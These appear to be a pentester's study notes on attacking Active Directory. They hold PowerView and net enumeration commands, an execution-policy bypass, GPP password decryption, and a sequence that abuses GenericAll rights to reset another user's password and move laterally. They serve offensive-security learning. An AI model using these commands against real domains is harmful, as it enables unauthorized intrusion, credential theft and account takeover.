## AD Permission Types
```
GenericAll: Full permissions on object
GenericWrite: Edit certain attributes on the object
WriteOwner: Change ownership of the object
WriteDACL: Edit ACE's applied to object
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Password change for object
Self (Self-Membership): Add ourselves to for example a group
```
## Do this whenever you get a new user!!
```
Display users in domain
net user /domain
net user [username] /domain (to check for specific user)
-----------------------------------------------------
Display groups in domain
net group /domain
net group "Group Name" /domain (to check specific group and its members)
-----------------------------------------------------
Displaying SPNs linked to user account
setspn -L [username]
------------------------------------------------------
Domain Class and GetCurrentDomain (Powershell)
powershell -ep bypass (IMPORTANT!!!)
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
-----------------------------------------------------
```

## Run PowerView.ps1
```
first, Import-Module .\PowerView.ps1

Syntax:
Get-NetDomain (obtain domain information)
Get-NetUser (obtaining all user information in the domain) | select cn,pwdlastset,lastlogon (cn=username,pwdlastset=time of when password was last set, lastlogon= time of when user last logon)
Get-NetGroup (obtaining all groups information in the domain) | select cn
Get-NetGroup "Group Name" | select member
-------------------------------------------------
Enumerating Operating Systems
Get-NetComputer (obtain all computer objects in the domain) | select operatingsystem,dnshostname
--------------------------------------------------
Finding Local Admin Privileges
Find-LocalAdminAccess
----------------------------------------------------
Checking for Logged on Users
Get-NetSession -ComputerName [name] -Verbose
----------------------------------------------------
Listing Service Accounts
Get-NetUser -SPN | select samaccountname,serviceprincipalname
-----------------------------------------------------
Enumerating Access Control Entries
Get-ObjectAcl -Identity [username]

Get-ObjectAcl -Identity "Group Name" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
-----------------------------------------------------
Converting ObjectSID into name
Convert-SidToName [SID]
-----------------------------------------------------
Querying Domain Shares
Find-DomainShare
```

## PsLoggedOn
```
Used to check any users who are logged on, can be potentially used to steal credentials

.\PsLoggedon.exe \\[name of computer]
```
## Listing Contents of a share
```
ls \\[ComputerName]\[Name]\[DomainName]
```
## Decrypting GPP-stored passwords
```
gpp-decrypt "password" [run in kali]
```
## Move this to lateral movement probably
```
Changing Password for User (GenericAll ACL)
Set-DomainUserPassword -Identity [username] -AccountPassword (ConvertTo-SecureString -AsPlainText "Password123@" -Force)

After changing, do runas /user:[domain\username] cmd.exe

Once cmd launched, run Powershell, import Powerview.ps1 and then Find-LocalAdminAccess
```
